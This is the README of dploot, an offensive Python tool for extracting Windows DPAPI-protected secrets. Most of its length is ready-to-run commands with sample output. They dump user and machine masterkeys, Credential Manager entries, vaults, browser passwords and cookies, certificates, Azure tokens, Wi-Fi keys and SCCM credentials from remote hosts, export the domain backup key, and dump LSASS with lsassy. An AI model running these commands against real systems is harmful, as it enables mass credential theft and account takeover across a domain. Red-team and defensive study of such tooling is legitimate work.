# dploot

dploot is Python rewrite of [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) written in C# by [Harmj0y](https://twitter.com/harmj0y), which is itself a port of DPAPI from [Mimikatz](https://github.com/gentilkiwi/mimikatz/) by [gentilkiwi](https://twitter.com/gentilkiwi). It implements all the DPAPI logic of these tools, but this time it is usable with a python interpreter and from a Linux environment.

If you don't know what is DPAPI, [check out this post](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107).

## Table of Contents

- [dploot](#dploot)
  - [Table of Contents](#table-of-contents)
  - [Installation](#installation)
  - [Usage](#usage)
    - [Protocols](#protocols)
    - [Kerberos](#kerberos)
  - [How to use](#how-to-use)
    - [Remote access via SMB](#remote-access-via-smb)
    - [Remote access via WMI](#remote-access-via-wmi)
    - [Remote access via WinRM](#remote-access-via-winrm)
    - [Remote access via MSSQL](#remote-access-via-mssql)
    - [Local filesystem access](#local-filesystem-access)
    - [Remote access via Cobalt Strike](#remote-access-via-cobalt-strike)
    - [As a domain administrator](#as-a-domain-administrator)
    - [As a non-domain administrator](#as-a-non-domain-administrator)
  - [Commands](#commands)
    - [User Triage](#user-triage)
      - [masterkeys](#masterkeys)
      - [credentials](#credentials)
      - [vaults](#vaults)
      - [rdg](#rdg)
      - [certificates](#certificates)
      - [browser](#browser)
      - [cng](#cng)
      - [wam](#wam)
      - [mobaxterm](#mobaxterm)
      - [triage](#triage)
    - [Machine Triage](#machine-triage)
      - [machinemasterkeys](#machinemasterkeys)
      - [machinecredentials](#machinecredentials)
      - [machinevaults](#machinevaults)
      - [machinecertificates](#machinecertificates)
      - [machinecng](#machinecng)
      - [machinetriage](#machinetriage)
    - [Misc](#misc)
      - [wifi](#wifi)
      - [sccm](#sccm)
      - [backupkey](#backupkey)
      - [blob](#blob)
  - [Credits](#credits)

## Installation

You can install dploot directly from PyPI with [pipx](https://github.com/pypa/pipx):

```text
pipx install git+https://github.com/zblurx/dploot.git
```

OR

```text
pipx install dploot
```

On [Kali Linux](https://www.kali.org/), you can install dploot from the repositories:

```text
sudo apt install python3-dploot
```

## Usage

```text
dploot (https://github.com/zblurx/dploot) v4.0.0 by @_zblurx
usage: dploot [-h]
              {backupkey,blob,browser,certificates,cng,credentials,machinecertificates,machinecng,machinecredentials,machinemasterkeys,machinetriage,machinevaults,masterkeys,mobaxterm,rdg,sccm,triage,vaults,wam,wifi}
              ...

DPAPI looting in Python

positional arguments:
  {backupkey,blob,browser,certificates,cng,credentials,machinecertificates,machinecng,machinecredentials,machinemasterkeys,machinetriage,machinevaults,masterkeys,mobaxterm,rdg,sccm,triage,vaults,wam,wifi}
                        Action
    backupkey           Backup Keys from domain controller
    blob                Decrypt DPAPI blob. Can fetch masterkeys on target
    browser             Dump users credentials and cookies saved in browser from local or remote target
    certificates        Dump users certificates from local or remote target
    cng                 Dump users CNG files blob from local or remote target
    credentials         Dump users Credential Manager blob from local or remote target
    machinecertificates
                        Dump system certificates from local or remote target
    machinecng          Dump system CNG files from local or remote target
    machinecredentials  Dump system credentials from local or remote target
    machinemasterkeys   Dump system masterkey from local or remote target
    machinetriage       Loot SYSTEM Masterkeys (if not set), SYSTEM credentials, SYSTEM certificates and SYSTEM vaults from local or remote target
    machinevaults       Dump system vaults from local or remote target
    masterkeys          Dump users masterkey from local or remote target
    mobaxterm           Dump Passwords and Credentials from MobaXterm
    rdg                 Dump users saved password information for RDCMan.settings from local or remote target
    sccm                Dump SCCM secrets (NAA, Collection variables, tasks sequences credentials) from local or remote target
    triage              Loot Masterkeys (if not set), credentials, rdg, certificates, browser and vaults from local or remote target
    vaults              Dump users Vaults blob from local or remote target
    wam                 Dump users cached azure tokens from local or remote target
    wifi                Dump wifi profiles from local or remote target

options:
  -h, --help            show this help message and exit
```

### Protocols

dploot v4.0.0+ supports multiple network protocols for remote access. You select the protocol using `--protocol <protocol_name>`. Each protocol has different capabilities and requirements:

- **smb** (default): Uses SMB/RPC for remote file access and registry operations. Works with most Windows targets. Supports Kerberos authentication. Works with [impacket](https://github.com/fortra/impacket)
- **wmi**: Uses Windows Management Instrumentation (DCOM) for remote execution and registry operations. Useful alternative to SMB. Supports Kerberos authentication. Works with [impacket](https://github.com/fortra/impacket)
- **winrm**: Uses Windows Remote Management for PowerShell-based operations. Common in modern environments. Works with [pypsrp](https://github.com/jborean93/pypsrp)
- **mssql**: Connects via MSSQL Server. Supports both domain and local database authentication. Supports Kerberos authentication. Works with [impacket](https://github.com/fortra/impacket)
- **local**: Accesses a mounted or copied Windows filesystem directly (no network connection needed). Useful for offline analysis of physical drives or disk images.
- **cobaltstrike**: Executes operations through a Cobalt Strike beacon REST API. Useful for red team operations with Cobalt Strike infrastructure.

Example using WMI protocol:
```text
$ dploot masterkeys --protocol wmi -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5
```

Example using local protocol (offline filesystem):
```text
$ dploot masterkeys --protocol local --root /mnt/c_drive -u bob -p Password
```

**Important notes on command support**: 
- Most commands support all protocols. However, `backupkey` only works with SMB protocol (requires domain controller access).
- Only **smb** protocol supports LSA dump to automaticaly dump the DPAPI machine key. For the other protocols, you will have to bring it by yourself with `--dpapi-system-key`.

### Kerberos

dploot can authenticate with Kerberos for the **smb**, **wmi**, and **mssql** protocols. Use `-k` to enable Kerberos with NTLM fallback. If you want to use a cached ticket, use `--use-kcache`. To use an AES key, use `--aesKey`.

```text
$ dploot masterkeys -d waza.local -u Administrator -k -t 192.168.57.5
```

## How to use

The goal of dploot is to simplify DPAPI related loot from a Linux box. How you use this tool depends on your access level and target configuration.

### Remote access via SMB

The default protocol is SMB. This is the most common approach for DPAPI looting and works with standard Windows file sharing:

```text
$ dploot masterkeys -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage ALL USERS masterkeys

{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22
{d37fa151-d670-4c58-9d70-3233b4918942}:8709574524ad35ef0b3a114b93990f8490d86cba
```

### Remote access via WMI

WMI provides an alternative to SMB for remote access and is useful when SMB is restricted:

```text
$ dploot masterkeys --protocol wmi -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage ALL USERS masterkeys

{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22
```

### Remote access via WinRM

WinRM can be used as an alternative protocol:

```text
$ dploot masterkeys --protocol winrm -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 --port 5985
```

### Remote access via MSSQL

If the target has MSSQL with accessible credentials, you can use the MSSQL protocol:

```text
$ dploot masterkeys --protocol mssql -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 --port 1433 --db-auth
```

### Local filesystem access

A different way of accessing DPAPI secrets is via direct filesystem access, for instance via physical access, extracting the drive and mounting the filesystem on your analysis machine. To use this mode, specify `--protocol local`. By default the target filesystem is expected to be in the current directory, but you can specify a different path with `--root`:

```text
$ dploot masterkeys --protocol local --root /mnt/c_drive -u bob -p Password
[*] Reading /mnt/c_drive

[*] Triage ALL USERS masterkeys

{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22
```

The `--root` directory should contain `Windows` and `Users` subdirectories matching the target system's structure.

### Remote access via Cobalt Strike

If you have a Cobalt Strike deployment with the [REST API](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_starting-rest-server.htm), you can execute dploot operations through it:

You can also select a beacon by note:
```text
$ dploot masterkeys --protocol cobaltstrike --rest-url https://127.0.0.1:50443 --cs-username admin --cs-password password --beacon-note "my-target"
```

If multiple beacons match the note, then you will be asked to select one of them. Once a beacon is selected, dploot will give you the corresponding Beacon ID, that you will be able to use in dploot like so:
```text
$ dploot masterkeys --protocol cobaltstrike --rest-url https://127.0.0.1:50443 --cs-username admin --cs-password password --beacon-id 1021841234
```

dploot will only call `dir` and `download` commands, uses the impersonated user on the selected beacon and the download will first check if the wanted file has already been downloaded.
By default the triage will be local but with `--remote-target` you can also triage remote hosts. You can supply a list of target users with `--target-users`, but this will skip listing users on the target.

### As a domain administrator

If you have domain admin privileges, you can obtain the domain DPAPI backup key with the `backupkey` command. This key can decrypt any DPAPI masterkeys for domain users and computers, and it will never change. Therefore, this key allows attackers to loot any DPAPI-protected password related to a domain user.

To obtain the domain backupkey (SMB protocol only):
```text
$ dploot backupkey -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.20 --quiet
[-] Exporting domain backupkey to file key.pvk
```

Then you can loot any user secrets stored on a Windows domain-joined computer on the network, for example with the `certificates` command (or any other user triage command):
```text
$ dploot certificates -d waza.local -u Administrator -p 'Password!123' -t 192.168.56.14 --pvk key.pvk --quiet
[-] Writting certificate to jsmith_waza.local_C0F800ECBA7BE997.pfx
[-] Writting certificate to jsmith_waza.local_D0C73E2C04BEAAB0.pfx
```

### As a non-domain administrator

If domain admin privileges have not been obtained (yet), using Mimikatz' `sekurlsa::dpapi` command will retrieve DPAPI masterkey {GUID}:SHA1 mappings of any loaded master keys (user and SYSTEM) on a given system. If you change these keys to a `{GUID1}:SHA1 {GUID2}:SHA1...` format, they can be supplied to dploot to triage the box. You can also use [lsassy](https://github.com/Hackndo/lsassy) to harvest decrypted masterkeys:

```text
$ lsassy -u Administrator -p 'Password!123' -d waza.local -t 192.168.56.14 -m rdrleakdiag -M masterkeys
[+] 192.168.56.14 Authentication successful
[+] 192.168.56.14 Lsass dumped in C:\Windows\Temp\ff32F.fon (57121318 Bytes)
[+] 192.168.56.14 Lsass dump deleted
[+] 192.168.56.14 WAZA\DESKTOP-OJ3N8TJ$        [NT] 0e43c22a4b09520cf79ca19a9e1bbec7 | [SHA1] 2ce587ab64aa3488c5ed412ca1e554d0f8e5a411
(snip)
[+] 192.168.56.14 5 masterkeys saved to /data/masterkeys
```

Then you can use this masterkey file to loot the targeted computer, for example with the `browser` command (or any other user triage command):

```text
$ dploot browser -d waza.local -u Administrator -p 'Password!123' -t 192.168.56.14 --mkfile /data/masterkeys
[*] Connected to 192.168.56.14 as waza.local\Administrator (admin)

[*] Triage Browser Credentials for ALL USERS

[MSEDGE LOGIN DATA]
URL:		
Username:	zblurx@gmail.com
Password:	Waza1234
```

You can also dump masterkey hashes with `--hashes-outputfile` option of the `masterkeys` command to crack them offline.

## Commands

### User Triage

#### masterkeys

The **masterkeys** command will get any user masterkey file and decrypt them with `--pvk FILE` (domain backup key), `--passwords FILE` (user:password combinations), or `--nthashes FILE` (user:nthash combinations). It will return a set of masterkey {GUID}:SHA1 mappings. Note that it will try to use the password or nthash that you used to connect to the target even if you don't specify corresponding options. You can use `--hashes-outputfile` to get every masterkey hash in Hashcat/JtR format in order to crack cleartext passwords.

*With domain backupkey*:

```text
$ dploot masterkeys -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 --pvk key.pvk
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage ALL USERS masterkeys

{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22
{d37fa151-d670-4c58-9d70-3233b4918942}:8709574524ad35ef0b3a114b93990f8490d86cba
{68e05bd7-9de9-46f0-95e3-b5036baa49e9}:2d87a923d05534da67d449cbad9a7390d019910a
```

*With password*:

```text
$ cat passwords
jsmith:Password#123
$ dploot masterkeys -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 --passwords passwords
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Triage ALL USERS masterkeys

{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22
{d37fa151-d670-4c58-9d70-3233b4918942}:8709574524ad35ef0b3a114b93990f8490d86cba
{68e05bd7-9de9-46f0-95e3-b5036baa49e9}:2d87a923d05534da67d449cbad9a7390d019910a
```

***Tips***: *With the `--mkfile` flag, dploot masterkeys will append looted masterkeys to a specified file. It is not a problem to store every masterkey in the same file, because a DPAPI BLOB stores the GUID of the masterkey that will be needed in order to decrypt it.*

#### credentials

The **credentials** command will search for users Credential files and decrypt them with `--mkfile FILE` of one or more {GUID}:SHA1, or with `--pvk FILE`, `--passwords FILE`, and `--nthashes FILE` options to first decrypt masterkeys.

With `--mkfile`:

```text
$ dploot credentials -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 --mkfile waza.mkf
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage Credentials for ALL USERS

[CREDENTIAL]
LastWritten : 2022-04-12 16:55:44
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=test
Description :
Unknown     :
Username    : test
Unknown     : Password#{123}
```

With `--pvk`:

```text
$ dploot credentials -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 --pvk key.pvk
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage ALL USERS masterkeys

{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22

[*] Triage Credentials for ALL USERS

[CREDENTIAL]
LastWritten : 2022-05-19 10:25:06
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=myserver.com
Description :
Unknown     :
Username    : Administrator
Unknown     : Naga2019*
```

#### vaults

The **vaults** command will search for users Vaults secrets and decrypt them with `--mkfile FILE` of one or more {GUID}:SHA1, or with `--pvk FILE`, `--passwords FILE`, and `--nthashes FILE` to first decrypt masterkeys.

With `--mkfile`:

```text
$ dploot vaults -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 --mkfile waza.local.mkf
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Triage Vaults for ALL USERS

[VAULT_VPOL_KEYS]
Key1: 0x552f5d5b454d3a53aec4ff458539de02
Key2: 0x5565757b5acd988e1a7377030fbe7098bff3e98050ae9bca458fe554b9e2586b

[Internet Explorer]
Username        : test
Resource        : http://testphp.vulnweb.com/
Password        : b'74006500730074000000'

Decoded Password: test
```

With `--pvk`:

```text
$ dploot vaults -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 --pvk key.pvk
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Triage ALL USERS masterkeys

{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22

[*] Triage Vaults for ALL USERS

[VAULT_VPOL_KEYS]
Key1: 0x552f5d5b454d3a53aec4ff458539de02
Key2: 0x5565757b5acd988e1a7377030fbe7098bff3e98050ae9bca458fe554b9e2586b

[Internet Explorer]
Username        : test
Resource        : http://testphp.vulnweb.com/
Password        : b'74006500730074000000'

Decoded Password: test
```

#### rdg

The **rdg** command will search for users RDCMan.settings files secrets and decrypt them with `--mkfile FILE` of one or more {GUID}:SHA1, or with `--pvk FILE`, `--passwords FILE`, and `--nthashes FILE` to first decrypt masterkeys.

With `--mkfile`:

```text
$ dploot rdg -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 --mkfile waza.local.mkf
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Triage RDCMAN Settings and RDG files for ALL USERS

[CREDENTIAL PROFILES]
	Profile Name:	WAZA\Administrator
	Username:	WAZA\Administrator
	Password:	Placeholder1234567890

[LOGON PROFILES]
	Profile Name:	Custom
	Username:	WAZA\Administrator
	Password:	Password!123

[SERVER PROFILES]
	Name:		DC01.waza.local
	Profile Name:	Custom
	Username:	WAZA\jdoe
	Password:	Password#123
```

#### certificates

The **certificates** command will search for users certificates from *MY* and decrypt them with `--mkfile FILE` of one or more {GUID}:SHA1, or with `--pvk FILE`, `--passwords FILE`, and `--nthashes FILE` to first decrypt masterkeys. By default, the tool will loot only certificates used for client auth, but with `--dump-all` you can harvest all of them.

With `--mkfile`:

```text
$ dploot certificates -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 --mkfile waza.mkf
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage Certificates for ALL USERS

Issuer:			CN=waza-ADCS1-CA,DC=waza,DC=local
Subject:		CN=John Smith,CN=Users,DC=waza,DC=local
Valid Date:		2022-05-24 09:51:33
Expiry Date:		2023-05-24 09:51:33
Extended Key Usage:
	Unknown OID (1.3.6.1.4.1.311.10.3.4)
	emailProtection (1.3.6.1.5.5.7.3.4)
	clientAuth (1.3.6.1.5.5.7.3.2)
	[!] Certificate is used for client auth!

-----BEGIN CERTIFICATE-----
MIIGDTCCBPWgAwIBAgITewAAAAJ+dBN7rSmWMAAAAAAAAjANBgkqhkiG9w0BAQ0F
(snip)
-----END CERTIFICATE-----

[-] Writting certificate to jsmith_waza.local_C0F800ECBA7BE997.pfx
```

***Tips***: *If you get a certificate with client authentication EKU, you can takeover the account with [certipy](https://github.com/ly4k/Certipy).*

#### browser

The **browser** command will search for users password and cookies in chrome-based browsers, and decrypt them with `--mkfile FILE`, `--pvk FILE`, `--passwords FILE`, or `--nthashes FILE`. Use `--show-cookies` to display stored cookies.

Since July 2024, [Chromium-based browsers support App Bound Key encryption](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html). To dump chromium cookies (and soon passwords) encrypted with App Bound Keys, you need to decrypt both user AND SYSTEM masterkeys. Use the `--v20support` flag for this.

With `--mkfile`:

```text
$ dploot browser -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 --mkfile waza.mkf
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage Browser Credentials for ALL USERS

[MSEDGE LOGIN DATA]
URL:		
Username:	admin
Password:	Password!123
```

#### cng

The **cng** command will search for users Cryptography Next Generation (CNG) key files and decrypt them with `--mkfile FILE`, `--pvk FILE`, `--passwords FILE`, or `--nthashes FILE` options.

```text
$ dploot cng -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 --pvk key.pvk
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage CNG files for ALL USERS

[CNG FILE]
User: jsmith
(snip)
```

#### wam

The **wam** command will search for TBRES files from Token Broker Cache and decrypt their content with `--mkfile FILE`, `--pvk FILE`, `--passwords FILE`, or `--nthashes FILE`.

***Tips***: *You can find Microsoft access tokens for Entra/Azure users in TBRES files.*

```text
$ dploot wam -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 --pvk key.pvk
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Triage ALL USERS masterkeys

{d5efdaf1-9fd9-44e7-8bd1-7e017d458c14}:a7eac2a750069aa576e1e9f03f1dc37b2057adb3

[*] Triage Office Token Broken Cache for ALL USERS

[TBRES FILE]
Version: 1
expiration: 133668881920000000
responses: b'\x8aC\xed\x9f\xf4\xe6D!\x0c\x82\x86)\xab\x1d\xf9\xac'
WTRes_Token: access_token=eyJhb[...]
```

#### mobaxterm

The **mobaxterm** command will extract MobaXterm secrets and masterpassword key from hive (HKU) and decrypt them with `--mkfile FILE`, `--pvk FILE`, `--passwords FILE`, or `--nthashes FILE` options. If the user is not connected on the remote target, dploot will download and extract secrets from NTUSER.dat.

```text
$ dploot mobaxterm -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 --pvk key.pvk
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Triage ALL USERS masterkeys

{6dedb662-3f3c-43a7-bfc4-e2990a48d4dd}:32c4eeeac475910a33f531b56cf9d73f35490d5e

[*] Triage MobaXterm Secrets

[MOBAXTERM CREDENTIAL]
Name:		TEST
Username:	user
Password:	waza1234
```

#### triage

The **triage** command runs the user triage commands: `masterkeys`, `credentials`, `vaults`, `rdg`, `certificates`, and `browser`. It's a convenience command for comprehensive user secret extraction.

### Machine Triage

#### machinemasterkeys

The **machinemasterkeys** command will dump DPAPI_SYSTEM LSA secrets to retrieve DPAPI_SYSTEM key which will then be used to decrypt any found machine masterkeys. It will return a set of masterkey {GUID}:SHA1 mappings.

```text
$ dploot machinemasterkeys -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage SYSTEM masterkeys

{b5ebf413-65bd-4ee7-aa49-2a3110f678d2}:ad7475c1efdf3e834037bead151e30beaefeb349
{c1027a5b-0dcc-4237-af05-19839a94c12f}:fda0c774f6a8ff189ef2759a151f2c6bcf6a4d46
{e1a73282-709b-4717-ace0-00eecb280fcc}:cdb4c86722b50cecf87cf683c6d727f36d760dba
```

You can also provide custom DPAPI SYSTEM keys with `--dpapi-system-key`:

```text
$ dploot machinemasterkeys -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 --dpapi-system-key dpapi_machinekey:0x...,dpapi_userkey:0x...
```

#### machinecredentials

The **machinecredentials** command will get any machine Credentials file found and decrypt them with `--mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI credentials blob.

```text
$ dploot machinecredentials -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage SYSTEM masterkeys

{07e6e8d6-7eae-4780-9aac-641818ddd9bb}:ddb9fa17d4e9ab12[...]

[*] Triage SYSTEM Credentials

[CREDENTIAL]
LastWritten : 2022-05-06 15:51:53
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:batch=TaskScheduler:Task:{31424469-6CCD-4137-8DFF-541872FD3CBB}
Description :
Unknown     :
Username    : WAZA\Administrator
Unknown     : Password!123
```

#### machinevaults

The **machinevaults** command will get any machine Vaults file found and decrypt them with `--mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI Vaults blob.

```text
$ dploot machinevaults -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Triage SYSTEM masterkeys

{c1027a5b-0dcc-4237-af05-19839a94c12f}:fda0c774f6a8ff189ef2759a151f2c6bcf6a4d46

[*] Triage SYSTEM Vaults

[VAULT_VPOL_KEYS]
Key1: 0x8a3dad10ce6ae44ba1700d1060cc28c4
Key2: 0x1514dd2c8f278ac517cf1ae09255aeaff62219a019bc21ac35321c040064b0b5
```

#### machinecertificates

The **machinecertificates** command will get any machine private key file found and decrypt them with `--mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI private key blob. It will also dump machine CAPI certificates blob via registry.

```text
$ dploot machinecertificates -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage SYSTEM masterkeys

{b5ebf413-65bd-4ee7-aa49-2a3110f678d2}:ad7475c1efdf3e834037bead151e30beaefeb349

[*] Triage SYSTEM Certificates

Issuer:			CN=waza-ADCS1-CA,DC=waza,DC=local
Subject:		CN=DESKTOP-OJ3N8TJ.waza.local
Valid Date:		2022-06-11 10:31:16
Expiry Date:		2023-06-11 10:31:16
Extended Key Usage:
	clientAuth (1.3.6.1.5.5.7.3.2)
	serverAuth (1.3.6.1.5.5.7.3.1)
	[!] Certificate is used for client auth!

-----BEGIN CERTIFICATE-----
MIIFjTCCBHWgAwIBAgITewAAAAXrqLLiBZJG3AAAAAAABTANBgkqhkiG9w0BAQ0F
(snip)
-----END CERTIFICATE-----

[-] Writting certificate to DESKTOP-OJ3N8TJ.waza.local_796449B12B788ABA.pfx
```

***Tips***: *If you get a certificate with client authentication EKU, you can takeover the account with [certipy](https://github.com/ly4k/Certipy).*

#### machinecng

The **machinecng** command will search for SYSTEM CNG key files and decrypt them with `--mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key.

```text
$ dploot machinecng -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage SYSTEM masterkeys

{b5ebf413-65bd-4ee7-aa49-2a3110f678d2}:ad7475c1efdf3e834037bead151e30beaefeb349

[*] Triage SYSTEM CNG files
```

#### machinetriage

The **machinetriage** command runs the machine triage commands: `machinemasterkeys`, `machinecredentials`, `machinevaults`, `machinecertificates`, and `machinecng`. It's a convenience command for comprehensive machine secret extraction.

### Misc

#### wifi

The **wifi** command will get any wifi xml configuration file and decrypt them with `--mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI wifi blob.

```text
$ dploot wifi -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)

[*] Triage SYSTEM masterkeys

{b5ebf413-65bd-4ee7-aa49-2a3110f678d2}:ad7475c1efdf3e834037bead151e30beaefeb349

[*] Triage ALL WIFI profiles

[WIFI]
SSID:		Wifi_G
AuthType:	WPA2PSK
Encryption:	AES
Preshared key:	AzErTy1234567890QwSxDcFvG
```

#### sccm

The **sccm** command will retrieve NAA credentials, collection variables and tasks sequences credentials from the remote target and decrypt them with `--mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI blob.

By default, SCCM reads the OBJECTS.DATA file via SMB. When using `--protocol wmi`, it will query WMI instead:

```text
$ dploot sccm -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Triage SYSTEM masterkeys

{c1027a5b-0dcc-4237-af05-19839a94c12f}:fda0c774f6a8ff189ef2759a151f2c6bcf6a4d46

[*] Triage SCCM Secrets

[NAA Account]
Username: NAAAccount
Password: Password!123
```

#### backupkey

The **backupkey** command will retrieve the domain DPAPI backup key from a domain controller using [MS-LDAP](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc). This key never changes and can decrypt any domain user DPAPI-protected secret. Domain Admin privileges are required. **This command only works with SMB protocol.**

By default, this command will write the domain backup key into a file called key.pvk, but you can change this with `--outputfile`. It is also possible to dump legacy backup key with `--legacy`.

```text
$ dploot backupkey -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.20
[*] Connected to dc01.waza.local as waza.local\Administrator (admin)

[DOMAIN BACKUPKEY V2]

PVK_FILE_HDR
dwMagic: {2964713758}
dwVersion: {0}
dwKeySpec: {1}
(snip)

[-] Exporting domain backupkey to file key.pvk
```

#### blob

The **blob** command will decrypt a DPAPI blob with `--mkfile FILE` of one or more {GUID}:SHA1, `--masterkey {GUID}:SHA1`, or with `--pvk FILE`, `--passwords FILE`, and `--nthashes FILE` to first decrypt masterkeys. You can provide the blob as base64 or in a file.

```text
$ dploot blob -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 --pvk key.pvk --blob 'AQAAANCMnd8BF[...]'
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Triage ALL USERS masterkeys

{d5efdaf1-9fd9-44e7-8bd1-7e017d458c14}:a7eac2a750069aa576e1e9f03f1dc37b2057adb3

[*] Trying to decrypt DPAPI blob

[BLOB]
Version          :        1 (1)
Guid Credential  : DF9D8CD0-1501-11D1-8C7A-00C04FC297EB
MasterKeyVersion :        1 (1)
Guid MasterKey   : 13405569-1685-49C7-90E2-0E7CE55E5B8B
Flags            :        0 ()
Description      :
CryptAlgo        : 00006603 (26115) (CALG_3DES)
Salt             : b'a5a15df8f0fb606897f28966dd5fcd9e'
HMacKey          : b''
HashAlgo         : 00008004 (32772) (CALG_SHA)
HMac             : b'80b2dc6cee8d206d5dc5a9ef844f000a'
Data             : b'5ece8ce1dd8[...]'

Data decrypted : b'0\x00\x00\x00\x01\x00\x00[...]' 
```

## Credits

Those projects helped a lot in writing this tool:

- [Impacket](https://github.com/SecureAuthCorp/impacket) by the community
- [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) by [Harmj0y](https://twitter.com/harmj0y)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz/) by [gentilkiwi](https://twitter.com/gentilkiwi)
- [DonPAPI](https://github.com/login-securite/DonPAPI) by [LoginSecurite](https://twitter.com/LoginSecurite)
- [WAMBam](https://github.com/xpn/WAMBam) by [_xpn_](https://twitter.com/_xpn_)
